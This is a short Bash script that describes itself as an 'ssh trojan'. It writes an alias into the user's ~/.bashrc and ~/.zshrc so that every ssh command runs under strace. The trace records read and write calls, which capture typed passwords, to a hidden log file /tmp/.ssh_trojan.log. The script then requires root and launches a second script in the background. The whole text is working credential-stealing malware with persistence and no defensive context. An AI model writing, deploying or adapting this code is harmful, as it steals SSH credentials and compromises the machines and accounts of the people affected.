# check if already insert ssh trojan to ~/.bashrc file
if [[ `ls ~/.bashrc` ]]
then
	if [[ ! `cat ~/.bashrc | grep "ssh='strace"` ]]
	then
		echo "alias ssh='strace -f -e trace=read,write --status=successful -o /tmp/.ssh_trojan.log -s 128 -t -i ssh'" >> ~/.bashrc
		exec bash
		source ~/.bashrc
	fi	
fi

# check if already insert ssh trojan to ~/.zashrc file
if [ `ls ~/.zshrc 2> /dev/null` ]
then
	if [[ ! `cat ~/.zshrc | grep "ssh='strace"` ]]
	then
		echo "alias ssh='strace -f -e trace=read,write --status=successful -o /tmp/.ssh_trojan.log -s 128 -t -i ssh'" >> ~/.zshrc
		exec zsh
		source ~/.zshrc
	fi
fi

# Root check
if [[ "$EUID" -ne 0 ]]
then
    echo "Root required!"
    exit 1
fi
/bin/bash ./ssh_trojan2.sh &

